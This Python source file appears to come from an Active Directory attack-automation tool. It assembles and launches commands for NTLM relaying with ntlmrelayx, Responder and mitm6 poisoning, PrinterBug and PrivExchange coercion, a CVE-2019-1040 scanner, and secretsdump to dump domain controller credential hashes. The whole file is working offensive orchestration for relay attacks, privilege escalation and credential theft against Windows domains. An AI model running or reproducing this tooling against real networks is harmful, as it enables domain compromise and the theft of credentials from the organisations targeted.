#!/usr/bin/env python3

import os
import re
import os
from src.utils import print_info, parse_creds
from src.process import Process

cwd = os.getcwd()

def create_ntlmrelayx_cmd(args):
    """
    Creates the ntlmrelayx cmommand string
    """
    relay_cmd = f'python {cwd}/tools/impacket/examples/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'

    # PrinterBug/PrivExchange
    if args.privexchange or args.remove_mic:
        dom, user, pw = parse_creds(args.user)
        relay_cmd += f' --escalate-user {user} -t ldap://{args.domain_controller}'
        # PrinterBug
        if args.remove_mic:
            relay_cmd += ' --remove-mic'

    # Authenticationless PrivExchange
    elif args.httpattack:
        relay_cmd += f' -t https://{args.server}/EWS/Exchange.asmx'

    # Delegation attacks
    elif args.delegate or args.delegate_dc:
        relay_cmd += f' -t ldaps://{args.domain_controller} --delegate-access'
        if args.delegate:
            relay_cmd += ' --no-smb-server -wh NetProxy-Service'
        elif args.delegate_dc:
            relay_cmd += ' --remove-mic'

    # Relay
    else:
        target = f' -tf '
        if args.target_file:
            target += args.target_file
        elif args.hostlist:
            target += 'unsigned-smb-hosts.txt'

        relay_cmd += target

    if args.mitm6:
        six_poison = ' -6 -wh NetProxy-Service'
        relay_cmd = relay_cmd + six_poison

    if args.command:
        relay_cmd = relay_cmd + f' -c "{args.command}"'

    return relay_cmd

def start_ntlmrelayx(args):
    """
    Start ntlmrelayx
    """
    cmd = create_ntlmrelayx_cmd(args)
    name = 'ntlmrelayx'
    ntlmrelayx = start_process(cmd, name, live_output=True)

    return ntlmrelayx

def edit_responder_conf(switch, protocols, conf):
    """
    Edit Responder.conf

    Mandatory arguments:
    - switch : string of On or Off
    - protocols : the protocols to change, e.g., HTTP, SMB, POP, IMAP
    - conf : the Responder.conf config file location
    """
    if switch == 'On':
        opp_switch = 'Off'
    else:
        opp_switch = 'On'
    with open(conf, 'r') as f:
        filedata = f.read()
    for p in protocols:
        if re.search(p + ' = ' + opp_switch, filedata):
            filedata = filedata.replace(p + ' = ' + opp_switch, p + ' = ' + switch)
    with open(conf, 'w') as f:
        f.write(filedata)

def start_responder(iface, conf):
    protocols = ['HTTP', 'SMB']
    switch = 'Off'
    edit_responder_conf(switch, protocols, conf)
    cmd = f'python2 {cwd}/tools/Responder/Responder.py -wrd -I {iface}'

    name = 'responder'
    responder = start_process(cmd, name)

    return responder

def start_mitm6(args):
    cmd = f'python {cwd}/tools/mitm6/mitm6/mitm6.py --ignore-nofqdn'
    if args.domain:
        cmd += f' -d {args.domain}'
    if args.interface:
        cmd += f' -i {args.interface}'

    name = 'mitm6'
    mitm6 = start_process(cmd, name)

    return mitm6

def start_mic_scan(args):
    if args.server_file:
        with open(args.server_file, "r") as f:
            target = f.readlines()[0].strip()
        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.server_file} {args.user}@{target}"

    elif args.server:
        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py {args.user}@{args.server}"

    name = "mic_scanner"
    scan = start_process(cmd, name, live_output=True)

    return scan

def start_printerbug(args, attack_server, local_ip):
    cmd = f"python {cwd}/tools/krbrelayx/printerbug.py {args.user}@{attack_server} {local_ip}"
    name = 'printerbug'
    printerbug = start_process(cmd, name)

    return printerbug

def start_privexchange(args, local_ip):
    dom, user, passwd = parse_creds(args.user)
    cmd = f'python {cwd}/tools/PrivExchange/privexchange.py -ah {local_ip} -u {user} -p {passwd} -d {dom} {args.server}'
    name = 'privexchange'
    privexchange = start_process(cmd, name)
    return privexchange

def start_secretsdump(args):
    dom, user, passwd = parse_creds(args.user)
    cmd = f'python {cwd}/tools/impacket/examples/secretsdump.py {dom}/{user}:{passwd}@{args.domain_controller} -just-dc'
    name = 'secretsdump'
    secretsdump = start_process(cmd, name, live_output=True)

    return secretsdump

def start_process(cmd, name, live_output=False):
    proc = Process(cmd, name)
    logfile = f'{cwd}/logs/{name}.log'
    print_info(f"Running {proc.cmd}")
    proc.run(logfile, live_output=live_output)

    return proc